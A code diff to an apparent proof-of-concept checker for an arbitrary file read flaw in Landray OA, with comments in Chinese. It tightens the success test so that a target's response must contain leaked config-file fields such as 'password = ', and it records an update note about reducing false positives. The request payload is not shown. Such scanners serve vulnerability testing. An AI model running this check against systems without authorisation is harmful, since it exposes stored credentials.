@@ -9,12 +9,12 @@ urllib3.disable_warnings()
 class POC(POCBase):
 
     _info = {
-        "author" : "hansi",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "author" : "hansi & jijue",                      # POC作者
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+        原POC逻辑过于简单，导致大量误报，经笔者优化，相对缓解  
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "蓝凌OA前台任意文件读取漏洞",                        # 漏洞名称
@@ -60,7 +60,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.post(url,headers = headers , data=data, proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "password" in req.text:
+            if req.status_code == 200 and "password = " in req.text and "kmss.properties.encrypt.enabled = " in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
